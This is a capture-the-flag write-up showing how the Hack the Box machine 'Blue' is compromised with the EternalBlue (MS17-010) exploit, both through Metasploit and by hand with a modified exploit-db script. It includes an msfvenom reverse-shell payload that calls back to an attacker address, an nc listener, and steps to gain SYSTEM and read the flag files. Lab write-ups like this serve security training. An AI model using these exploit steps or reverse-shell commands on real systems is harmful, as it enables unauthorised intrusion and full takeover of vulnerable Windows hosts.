=======================================================

## Introduction

=======================================================

Blue is a classic Hack the Box example of the name providing a clue to as to what you are looking for or going to use.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

Eternal Blue, MS17-010. 'nuf said.

The vulnerability we will exploit here allows remote code execution via a specially crafted message to a Microsoft Server Message Block 1.0 (SMBv1) server.

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start with a basic nmap scan to see what ports are open and services are available:

    nmap -A -T4 10.10.10.40

![](/images/blue/1. nmap.png "nmap")
![](/images/blue/2. nmap_2.png "nmap")

Here we see Windows 7, SP1 with ports 135, 139, and 445 open.

smb-security-mode shows us "message_signing" disabled.

Looks like a candidate for Eternal Blue, MS17-010. Google yields a bunch of results, but we are going to look at:

## Exploitation using Metasploit

=======================================================


On the Rapid7 website we see the following information:

![](/images/blue/3. rapid7.png "rapid7")

![](/images/blue/4. rapid7_2.png "rapid7")

A note here explains the exploit does not work all the time but can be re-run. Keep this in mind, even when we move on to manual exploitation.

![](/images/blue/5. rapid7_3.png "rapid7")

As usual, the Rapid7 site gives us the Metasploit module commands we need to run, so let's try them out.

    use exploit/windows/smb/ms17_010_eternalblue

    show options

![](/images/blue/6. msf.png "msf")

We have RHOSTS mandatory and other options as optional. If we do not supply anything but RHOSTS then it will attempt an anonymous login. 

Since we have no other credentials for this box, we will supply RHOSTS and run it:

    set rhosts 10.10.10.40

    run

![](/images/blue/7. msf_2.png "msf")
![](/images/blue/8. msf_3_exploit_fail.png "msf_fails")

As you can see here, the exploit failed the first time and automatically tried again, increasing the number of groom allocations. It will continue to do so until it succeeds or runs out.

Each one of these exploit attempts takes approximately 30 seconds - 1 minute to complete so be patient.

Eventually, my first attempt failed after 22 groom allocations as shown below:

![](/images/blue/9. msf_4_exploit_fail_2.png "msf_fails_again")

So let's try again...eventually you will see:

![](/images/blue/10. msf_5_exploit_win.png "exploit win")

And now we have a shell!  Since this is Windows 7, “whoami” should work:

![](/images/blue/11. whoami.png "whoami")

Success! We are system. Let's go get some flags:

    cd C:\Users

    dir

![](/images/blue/12. enum.png "enum")

We have users haris and Administrator.  The files should be on their desktops.

![](/images/blue/13. flags.png "flags")

And we have our flags.

## Manual Exploitation

=======================================================

Manual exploitation on this one is a bit more complex, but worth it.  Much of what follows comes from here:
[https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/)

To start, we will use Kali Linux's searchsploit command to search the exploit database for a match on MS17-010:

    searchsploit MS17-010

![](/images/blue/14. searchsploit.png "searchsploit")

Since we know from nmap that this is a Windows 7 machine, we are going to use 42315.py, so make a copy to your local directory. If you are not on Kali linux, you can find 42315.py at the Exploit-db entry here: [https://www.exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315)

In this case I renamed the file to “blue.py”. Once you make the copy, open it in your text editor of choice.
    
    cp /usr/share/exploitdb/exploits/windows/remote/42315.py blue.py

Next we need to download a file, mysmb.py, that our exploit script depends on (see the import statements at the top of the script):

    wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

![](/images/blue/15. wget.png "wget")

Place the mysmb.py file in the same directory as your blue.py (if you downloaded it elsewhere).

Now, let's run our blue.py with no options to see what it does:

    python blue.py

![](/images/blue/16. blue.py.usage.png "blue.py usage")

So we need two things, the IP address, which we already have (10.10.10.40) and a pipe name, or named pipe in Windows parlance.

You can read more about what a named pipe is here: [https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)

The shortest description I have seen is in the null-byte walkthrough: “Named pipes are a way for running processes to communicate with each other with very little overhead.”

Metasploit has a scanner for named pipes that we can use: 

    use auxiliary/scanner/smb/pipe_auditor

    show options

![](/images/blue/17. msf_pipe_auditor.png "msf pipe auditor")

We need to set RHOSTS and then run it.

    set rhosts 10.10.10.40

    run

![](/images/blue/18. msf_pipe_auditor_2.png "msf pipe auditor")

Here we have \netlogon, \browser, \eventlog, \ntsvcs, \lsass, \srvsvc\ and others.

For this exploit, a good one to use is \netlogon so we will go with that.

So now our exploit command should look like this:

    python blue.py 10.10.10.40 netlogon

But we are not ready yet. One thing we did not check is what this python script is actually doing. If we read the description, you will see it is a proof of concept script, so all it does is drop a .txt file on the target to prove execution.  

In your text editor with blue.py open, search for “def smb_pwn”.  You should see it around line 913 or so in the code.  

![](/images/blue/19. blue.py.edit.png "edit blue.py")

Immediately below in the commented out block (blue-ish text above) we see additional code and notes.  This code uses smb to send a file to the remote machine and then execute it.  The notes tell us we can gain a shell by making an exe file, sending it and exeuting it on the target.

To do this, we need to make our own Windows executable to give us a reverse shell. The easiest way to do this is using msfvenom:  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 -f exe > blue.exe

-p for payload, in this case a Windows reverse tcp shell

LHOST= is our attacking machine, with LPORT= 443 we will be listening on using nc

-f for format, exe in this case for a Windows executable file

\> finally we redirect the output into an exe file (blue.exe)

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 -f exe > blue.exe

![](/images/blue/20. msfvenom.png "msfvenom")

Next we need to adjust the code block above. We do not want to create the text file so we can comment out lines 916-920. Then to upload our blue.exe and execute it we will un-comment lines 922 and 923 and alter them. Lastly, I always like to include the msfvenom command I used to generate the exploit in case I need to go back and look at the code later.

Alter your code to look like this:

![](/images/blue/21. blue.py.edit.png "edit blue.py")

Changes: commented out lines 916-920.  Un-commented and changed lines 922 and 923.  Added commented line 924.

The last change we need to make is back near the top of the script, somehwere near line 40:

![](/images/blue/22. blue.py.edit_password.png "edit blue.py username/password")

Add // between the single quotes so it looks like this:

![](/images/blue/23. blue.py.edit_password.png "edit blue.py username/password")

Save your blue.py, and let's set up our listener on port 443 in another terminal window:

    nc -lvnp 443

![](/images/blue/24. nc_listener.png "nc listener")

Now let's run our exploit:

    python blue.py 10.10.10.40 netlogon

![](/images/blue/25. blue.py_exploit.png "run the blue.py exploit")

So even though it looks like we received an error...over in our second terminal window we see the connection:

![](/images/blue/26. nc_connection.png "nc connection")

We have a shell!

    whoami

![](/images/blue/11. whoami.png "whoami")

And we are system!  Let's go get our flags:

    cd C:\Users
    
    dir

![](/images/blue/12. enum.png "enum")

We have users haris and Administrator. The user.txt and root.txt files should be on their desktops:

    type haris\Desktop\user.txt

    type Administrator\Desktop\root.txt

![](/images/blue/13. flags.png "flags")

And there are the flags.
